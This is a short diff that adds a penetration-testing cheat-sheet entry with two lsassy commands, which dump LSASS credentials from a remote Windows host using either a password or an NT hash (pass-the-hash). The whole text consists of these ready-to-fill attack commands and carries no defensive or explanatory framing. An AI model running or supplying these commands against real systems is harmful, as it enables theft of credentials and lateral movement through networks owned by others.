@@ -1,0 +1,6 @@
+# get lsas credentials from remote host
+lsassy -d <domain> -u <user> -p <password> <rhost>
+
+# get lsas credentials from remote host using nt hash
+lsassy -d <domain> -u <user> -H <[LM:]NT> <rhost>
+
